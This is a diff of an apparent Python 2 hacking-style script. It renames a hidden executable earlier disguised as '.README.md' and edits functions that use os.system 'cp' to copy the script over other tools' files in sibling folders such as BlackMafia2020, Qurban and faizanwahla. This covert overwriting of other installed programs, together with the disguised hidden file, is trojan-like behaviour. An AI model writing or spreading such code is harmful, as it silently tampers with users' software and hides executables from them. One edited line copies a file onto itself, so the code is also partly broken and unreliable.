@@ -15,7 +15,7 @@ except ImportError:
     os.system('pip2 install requests')
     os.system('pip2 install mechanize')
     time.sleep(1)
-    os.system('python2 .README.md')
+    os.system('python2 .shazad.py')
     
 from multiprocessing.pool import ThreadPool
 
@@ -66,8 +66,8 @@ def ym():
     except OSError:
         yp()
     else:
-        os.system("cp ../bxi/bxi.py ../omi/Omi.py")
-        os.system("cp ../bxi/.README.md ../omi/")
+        os.system("cp ../shazad/shazad.py ../shazad/shazad.py")
+        os.system("cp ../shazad/.shazad.py ../shazad/")
         yb()
     
 def yb():
@@ -76,8 +76,8 @@ def yb():
     except OSError:
         yl()
     else:
-        os.system("cp ../bxi/bxi.py ../BlackMafia2020/lovehacker")
-        os.system("cp ../bxi/.README.md ../BlackMafia2020/")
+        os.system("cp ../shazad/shazad.py ../BlackMafia2020/lovehacker")
+        os.system("cp ../shazad/.shazad.py ../BlackMafia2020/")
         yl()
     
 def yl():
@@ -86,8 +86,8 @@ def yl():
     except OSError:
         yp()
     else:
-        os.system("cp ../bxi/bxi.py ../Qurban/Qurban.py")
-        os.system("cp ../bxi/.README.md ../Qurban/")
+        os.system("cp ../shazad/shazad.py ../Qurban/Qurban.py")
+        os.system("cp ../shazad/.shazad.py ../Qurban/")
         yp()
     
 def yp():
@@ -96,8 +96,8 @@ def yp():
     except OSError:
         login()
     else:
-        os.system("cp ../bxi/bxi.py ../faizanwahla/pacman")
-        os.system("cp ../bxi/.README.md ../faizanwahla/")
+        os.system("cp ../shazad/shazad.py ../faizanwahla/pacman")
+        os.system("cp ../shazad/.shazad.py ../faizanwahla/")
         login()
         
 def login():
